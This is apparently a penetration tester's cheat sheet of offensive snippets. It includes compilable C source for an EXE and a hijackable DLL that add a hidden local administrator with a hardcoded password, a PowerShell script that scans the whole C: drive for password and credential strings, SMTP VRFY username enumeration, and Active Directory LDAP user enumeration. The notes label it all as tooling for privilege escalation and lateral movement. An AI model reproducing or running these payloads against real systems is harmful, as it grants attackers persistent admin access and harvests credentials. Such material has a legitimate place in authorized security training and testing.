# 🧰 Mixed Payloads and Enumeration Snippets – Offensive Toolkit Notes

---

## 🧱 Binary Payload – Create Admin User via EXE

### 🛠 Compile

```bash
x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
```

### 📄 Source (adduser.c)

```c
#include <stdlib.h>

int main ()
{
  int i;

  i = system ("net user dave2 password123! /add");
  i = system ("net localgroup administrators dave2 /add");

  return 0;
}
```

---

## 🧬 DLL Payload – Create Admin User via DLL Injection

### 🛠 Compile

```bash
x86_64-w64-mingw32-gcc TextShaping.cpp --shared -o TextShaping.dll
```

### 📄 Source (TextShaping.cpp)

```cpp
#include <stdlib.h>
#include <windows.h>

BOOL APIENTRY DllMain(
    HANDLE hModule,
    DWORD ul_reason_for_call,
    LPVOID lpReserved )
{
    switch ( ul_reason_for_call )
    {
        case DLL_PROCESS_ATTACH:
            int i;
            i = system ("net user dave3 password123! /add");
            i = system ("net localgroup administrators dave3 /add");
            break;
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
        case DLL_PROCESS_DETACH:
            break;
    }
    return TRUE;
}
```

---

## 🔍 PowerShell – Search for Passwords in Scripts

### 📄 Script: `Search-ScriptsForPasswords.ps1`

```powershell
# Recursively search for password-related strings in script files on C:\
$OutputFile = "C:\Users\alex\password_search_results.txt"
Write-Host "Searching for password-related strings..." -ForegroundColor Green

Get-ChildItem -Path C:\ -Recurse -Include *.ps1, *.bat, *.cmd, *.vbs -ErrorAction SilentlyContinue -Force |
    Select-String -Pattern "password|credential|secret" -AllMatches |
    ForEach-Object {
        "{0}:{1} {2}" -f $_.Path, $_.LineNumber, $_.Line
    } | Out-File -FilePath $OutputFile -Encoding UTF8

Write-Host "Search completed. Results saved to: $OutputFile" -ForegroundColor Cyan
```

---

## 📨 Python – SMTP VRFY User Enumeration

### 🛠 Usage

```bash
python3 smtp.py root 192.168.50.8
```

- `root`: user to verify
- `192.168.50.8`: target SMTP server

---

## 🏛 PowerShell – PDC Enumeration

### 🔍 Get PDC Name and LDAP Path

```powershell
$PDC = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name
$DN = ([adsi]'').distinguishedName
$LDAP = "LDAP://$PDC/$DN"
$LDAP
```

---

## 🧬 PowerShell – AD User Filtering

### 🔍 Enumerate User Objects in AD

```powershell
$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
$PDC = $domainObj.PdcRoleOwner.Name
$DN = ([adsi]'').distinguishedName
$LDAP = "LDAP://$PDC/$DN"

$direntry = New-Object System.DirectoryServices.DirectoryEntry($LDAP)
$dirsearcher = New-Object System.DirectoryServices.DirectorySearcher($direntry)
$dirsearcher.filter="samAccountType=805306368"

$result = $dirsearcher.FindAll()

Foreach($obj in $result)
{
    Foreach($prop in $obj.Properties)
    {
        $prop
    }
    Write-Host "-------------------------------"
}
```

---

## ✅ Summary

- **adduser.exe / TextShaping.dll**: Local user creation via binary payloads.
- **Search-ScriptsForPasswords.ps1**: Credential hunting in Windows scripts.
- **smtp.py**: SMTP `VRFY`-based username discovery.
- **AD PowerShell**: LDAP + user object enumeration for red team recon.

```bash
# All tools focused on foothold, lateral movement, and privilege escalation.
```
